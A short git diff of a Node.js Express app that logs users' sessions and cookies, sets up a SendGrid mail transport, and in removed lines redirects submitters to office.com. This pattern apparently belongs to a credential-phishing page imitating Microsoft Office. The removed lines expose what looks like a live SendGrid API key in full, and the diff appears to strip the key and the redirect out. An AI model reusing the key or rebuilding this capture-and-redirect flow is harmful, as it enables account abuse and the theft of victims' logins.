@@ -91,13 +91,13 @@ req.session.username = req.body.username;
 //   }
 // });
 
-res.render("second", { username: username });
+res.render("first", { username: username });
 });
 
-// app.post("/first", function(req, res) {
-//   var username = req.body.username;
-//   res.render("second", {username: username});
-// });
+app.post("/first", function(req, res) {
+  var username = req.body.username;
+  res.render("second", {username: username});
+});
 
 
 
@@ -131,12 +131,12 @@ req.session.cookie.path = '/';
     } else {
 
       let transporter = nodemailer.createTransport({
-        host: "smtp.sendgrid.net",
-        port: 465,
+        host: "",
+        port:"" ,
         secure: true,
         auth: {
-          user: 'apikey',
-          pass: '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'
+          user: '',
+          pass: ''
         },
 
       });
@@ -226,7 +226,7 @@ app.post("/third", function(req, res) {
       console.log(`Session: ${JSON.stringify(req.session)}`);
       console.log(`Cookies: ${JSON.stringify(req.cookies)}`);
       // redirect to the specified URL
-      res.redirect("https://www.office.com/")
+      res.render("final")
     }
   });
 });
